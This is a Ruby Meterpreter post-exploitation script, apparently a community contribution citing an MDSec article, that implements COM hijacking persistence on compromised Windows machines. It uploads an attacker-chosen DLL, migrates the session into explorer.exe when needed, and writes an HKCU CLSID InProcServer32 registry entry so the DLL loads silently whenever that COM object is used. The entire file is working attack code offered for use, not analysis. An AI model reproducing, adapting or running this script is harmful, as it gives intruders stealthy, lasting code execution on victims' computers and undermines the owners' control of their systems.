#author ：demonsec666
#author ：WBGII
#LINK   : https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-2-com-hijacking/
#VIDEO  : https://youtu.be/xKRDo6Q6r3Y
require "rexml/document"
session = client
@@exec_opts = Rex::Parser::Arguments.new(
  "-h" => [ false,"Help menu." ],
  "-u" => [ true, "upload File" ],
  "-p" => [ true, "upload path"]
)


def usage()
  print_line  "run comhijack -p c:\\\\windows\\\\temp\\\\comhijack.dll -u <YOU DLL>"
  print_line(@@exec_opts.usage)
  raise Rex::Script::Completed
end

def unsupported
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end

unsupported if client.platform != 'windows'
#parsing of Options
file_name = nil
fila_path = nil
info=client.sys.config.sysinfo

@@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-p"
    fila_path = val
  when "-h"
  # puts "run  comhijack -p c:/\\windows/\\temp/\\comhijack.dll -u <YOU DLL>"
  usage
  raise Rex::Script::Completed

  when "-u"
    file_name = val

  print_status("upload #{file_name} -> #{fila_path}")
    if upload_file("#{fila_path}","#{file_name}")
      print_good("success upload #{file_name} -> #{fila_path}")
    end
  end
}

unless info['Architecture']==session.arch
    session.run_cmd("run migrate -n explorer.exe")
end

registry_path="HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}"
if registry_createkey(registry_path)
  print_good("success created HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}")
end

if registry_createkey(registry_path+"\\InProcServer32")
  print_good("success created HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32")
end

if registry_setvaldata(registry_path+"\\InProcServer32","","#{fila_path}","REG_SZ")
  print_good("success created HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32 default value #{fila_path}")
end

if registry_setvaldata(registry_path+"\\InProcServer32","ThreadingModel","Both","REG_SZ")
  print_good("success created HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32 ThreadingModel value Both")
end
